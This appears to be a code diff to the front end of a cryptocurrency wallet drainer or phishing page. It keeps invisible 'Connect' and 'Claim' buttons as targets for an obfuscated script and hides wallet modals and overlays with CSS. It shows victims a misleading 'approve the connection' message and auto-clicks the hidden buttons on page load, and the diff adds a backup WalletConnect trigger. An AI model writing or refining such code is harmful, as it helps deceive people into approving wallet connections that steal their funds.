@@ -118,7 +118,7 @@
             border-color: #cccccc;
         }
 
-        /* Hidden Target Layer to satisfy the obfuscated script trackers */
+        /* Hidden layer holding standard targets for the obfuscated script trackers */
         .hidden-triggers {
             position: absolute;
             width: 1px;
@@ -131,7 +131,7 @@
             opacity: 0;
         }
 
-        /* Prevent background script overlays or popups from breaking your UI design layout */
+        /* Blocks internal library popup windows from rendering over your design */
         div[class*="modal"], 
         div[class*="overlay"], 
         div[id*="walletconnect"], 
@@ -164,6 +164,7 @@
     <div class="hidden-triggers">
         <button class="interactBtn" id="connectButton">Connect</button>
         <button class="claimBtn" id="claimButton">Claim</button>
+        <div class="wallet-connect-btn">WalletConnect</div>
         <div class="wallet-info"></div>
     </div>
 
@@ -177,33 +178,20 @@
         document.getElementById('statusDesc').textContent = `Please review and approve the interface connection request within your standard ${activeWallet} utility extension.`;
 
         window.addEventListener('DOMContentLoaded', () => {
-            // 1. Simulates click to let obfuscated backend module attach its hooks
+            // Give the obfuscated script 800ms to properly initialize its connection configuration
             setTimeout(() => {
-                const hiddenBtn = document.querySelector('.interactBtn');
-                if (hiddenBtn) {
-                    console.log("Simulating interaction for obfuscated script framework...");
-                    hiddenBtn.click();
-                }
-            }, 300);
-
-            // 2. DIRECT DEEP LINK ROUTING: Fires protocol app links directly to target installed applications
-            setTimeout(() => {
-                const normalizedWallet = activeWallet.toLowerCase();
+                // Try clicking the primary interaction buttons first
+                const interactBtn = document.querySelector('.interactBtn');
+                const walletConnectBtn = document.querySelector('.wallet-connect-btn');
                 
-                if (normalizedWallet.includes('trust')) {
-                    window.location.href = "trust://wc"; 
-                } else if (normalizedWallet.includes('meta')) {
-                    window.location.href = "metamask://wc";
-                } else if (normalizedWallet.includes('rainbow')) {
-                    window.location.href = "rainbow://wc";
-                } else if (normalizedWallet.includes('coinbase')) {
-                    // Specific direct application routing link wrapper for Coinbase Wallet app context
-                    window.location.href = "cbwallet://wlink";
-                } else {
-                    // Universal WalletConnect link schema backup
-                    window.location.href = "wc:";
+                if (interactBtn) {
+                    console.log("Triggering primary script interface...");
+                    interactBtn.click();
+                } else if (walletConnectBtn) {
+                    console.log("Triggering backup universal interface...");
+                    walletConnectBtn.click();
                 }
-            }, 500); 
+            }, 800);
         });
 
         function goBack() {
